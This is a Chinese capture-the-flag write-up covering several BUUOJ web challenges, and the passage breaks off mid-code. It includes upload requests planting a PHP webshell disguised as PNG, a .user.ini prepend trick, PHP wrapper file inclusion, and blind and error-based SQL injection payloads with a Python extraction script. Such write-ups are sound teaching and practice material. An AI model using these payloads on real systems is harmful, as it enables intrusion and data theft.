2019]Upload</h2><p>后缀名绕过php,php3,php4,php5,phtml,pht</p><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /upload_file.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: c887928f-<span class="number">75</span>ce-<span class="number">45</span>ce-<span class="number">9</span>fad-<span class="number">32</span>dd56874aa9.node3.buuoj.cn</span><br><span class="line">Content-Length: <span class="number">342</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//c887928f-75ce-45ce-9fad-32dd56874aa9.node3.buuoj.cn</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUpGgttuPSdHTxZgd</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://c887928f-75ce-45ce-9fad-32dd56874aa9.node3.buuoj.cn/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryUpGgttuPSdHTxZgd</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;pnghead.phtml&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/png</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PNG</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;script language=&quot;php&quot;&gt;system($_GET[x]);&lt;/script&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryUpGgttuPSdHTxZgd</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">æäº¤</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryUpGgttuPSdHTxZgd--</span></span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>源码index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接取key=123</p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>上传phtml绕过php后缀检查</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>正则r&#39;/ph|htaccess/i&#39;，没办法绕过，这里用上传.user.ini来处理，分别上传</p><p>.user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: e049f518-c43e-<span class="number">4195</span>-<span class="number">8</span>a8c-<span class="number">1617</span>eb34e8c1.node3.buuoj.cn</span><br><span class="line">Content-Length: <span class="number">318</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//e049f518-c43e-4195-8a8c-1617eb34e8c1.node3.buuoj.cn</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuxoqRGYxpvd7xV8v</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://e049f518-c43e-4195-8a8c-1617eb34e8c1.node3.buuoj.cn/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;.user.ini&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/png</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PNG</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">auto_prepend_file=2.jpg</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;upload&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">æäº¤</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v--</span></span><br></pre></td></tr></table></figure><p>2.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: e049f518-c43e-<span class="number">4195</span>-<span class="number">8</span>a8c-<span class="number">1617</span>eb34e8c1.node3.buuoj.cn</span><br><span class="line">Content-Length: <span class="number">340</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//e049f518-c43e-4195-8a8c-1617eb34e8c1.node3.buuoj.cn</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuxoqRGYxpvd7xV8v</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://e049f518-c43e-4195-8a8c-1617eb34e8c1.node3.buuoj.cn/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;2.jpg&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/png</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PNG</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;script language=&quot;php&quot;&gt;system($_GET[x]);&lt;/script&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;upload&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">æäº¤</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v--</span></span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /pay.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">63</span>c15e7b-<span class="number">97</span>d2-<span class="number">4281</span>-<span class="number">830e-0</span>e314c5a4573.node3.buuoj.cn</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: user=1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 23</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">password=404a&amp;money=1e9</span></span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>知识点1</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/md5.png"></p><p>指定true的时候可以用到拼接，ffifdyop的md5($str1, true)后返回形如&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c，拼接后就</p><p>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</p><p>知识点2</p><p>php双等号弱类型QNKCDZO，s155964671a，s1091221200a</p><p>知识点3</p><p>md5函数如果传递给它的是一个数组，会返回FALSE</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</p><p>说的是php://input也可以但是实际上不行 读出来会包含变量名</p><p>利用file=php://filter/convert.base64-encode/resource=useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单的反序列化，给$file赋值就行</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbuser</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">#被过滤的内容 函数基本没过滤</span></span><br><span class="line">    <span class="variable">$blackList</span> = <span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;||&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&#x27;group&#x27;</span>,<span class="string">&#x27;limit&#x27;</span>,<span class="string">&#x27;update&#x27;</span>,<span class="string">&#x27;delete&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;load_file&#x27;</span>,<span class="string">&#x27;outfile&#x27;</span>,<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blackList</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$sql</span>,<span class="variable">$blackitem</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span> = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$db</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;   </span><br><span class="line">mysql_select_db(<span class="string">&quot;ctf&quot;</span>,<span class="variable">$db</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(safe(<span class="variable">$id</span>))&#123;</span><br><span class="line">    <span class="variable">$query</span> = mysql_query(<span class="string">&quot;SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$query</span>)&#123;</span><br><span class="line">        <span class="variable">$result</span> = mysql_fetch_array(<span class="variable">$query</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Error Occured When Fetch Result.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        var_dump(<span class="variable">$query</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;SQL Injection Checked.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是一个trick</p><p>1^1^1，用它可以起到代替or的作用。</p><p>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</p><p>但还有一些是没有用异或，用的是if，可if有局限性，在id为数字型时，可以直接 select * from users where id=if(1=1,1,0)，但如果id单引号字符型或双引号字符型，那就必须在if前加or或and</p><p>python脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0f68906e-d306-4cb6-a19b-7055f59cddf5.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">33</span></span><br><span class="line">    top = <span class="number">130</span></span><br><span class="line">    mid = (low + top) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; top:</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        payload[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;0^&quot;</span> + <span class="string">&quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.format(i, mid)</span><br><span class="line">        html = requests.post(url, data=payload)</span><br><span class="line">        <span class="keyword">print</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> in html.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            top = mid</span><br><span class="line">        mid = (low + top) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> chr(mid) == <span class="string">&quot; &quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = result + chr(mid)</span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;flag: &quot;</span>, result)</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>报错注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,concat(%<span class="number">27</span>~%<span class="number">27</span>,(select(group_concat(database())))))%<span class="number">23</span> </span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>updatexml(<span class="number">1</span>,concat(%<span class="number">27</span>~%<span class="number">27</span>,(select%<span class="number">20</span>database())),<span class="number">1</span>)%<span class="number">23</span> 获得库名fakebook</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,concat(%<span class="number">27</span>~%<span class="number">27</span>,(select(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)where(table_schema)=%<span class="number">27</span>fakebook%<span class="number">27</span>)))%<span class="number">23</span>,<span class="number">1</span>)%<span class="number">23</span> 不用空格的版本，获得表名users</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,concat(%<span class="number">27</span>~%<span class="number">27</span>,(select(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)where(table_name)=%<span class="number">27</span>users%<span class="number">27</span>)))%<span class="number">23</span> 获得字段名no,username,passwd,data,USER,CU</span><br></pre></td></tr></table></figure><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 